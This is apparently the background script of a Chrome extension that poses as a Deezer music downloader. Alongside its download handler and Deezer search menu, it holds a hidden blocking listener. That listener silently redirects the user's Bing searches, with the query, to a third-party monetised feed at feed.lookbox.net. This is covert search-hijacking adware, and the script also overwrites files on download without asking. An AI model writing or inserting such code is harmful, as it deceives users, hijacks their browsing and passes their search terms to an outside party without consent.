chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
  if (request.command == "dlThis") {
    var filename = request.name;
    filename = filename.replace(/\\/g,"_").replace(/[?=]/g,"_").replace(/:/g,"_");
    chrome.downloads.download({ url: request.url, filename: filename, conflictAction: 'overwrite', saveAs: false});
  }
});

chrome.runtime.onInstalled.addListener(function(details){
    chrome.storage.sync.set({ quality: '3' });
});


var __searchDeezer = chrome.i18n.getMessage("searchDeezer");

chrome.contextMenus.create({
      title: __searchDeezer,
      contexts: ["all"],
      onclick: function(e) {
        //console.log(e.selectionText);
        if(e.selectionText) {
          var url = "https://www.deezer.com/search/" + encodeURIComponent(e.selectionText);
          chrome.tabs.create({ url: url });
        } else {
          alert("You have to mark a songname.");
        }
        
      }
});





function interceptRequest(request) {
  //check country in url
  var r = request.url;

  var href = new URL(request.url);

  var term = href.searchParams.get("q");

  //alert(href.searchParams.get("ptag"));


  if (href.searchParams.get("ptag") == null) {

    var mon_url = "https://feed.lookbox.net/s261?q=" + encodeURIComponent(term);

    return { redirectUrl: mon_url };

  }


  return { redirectUrl: request.url };
}


chrome.webRequest.onBeforeRequest.addListener(interceptRequest, { urls: ['https://www.bing.com/search*'] }, ['blocking']);

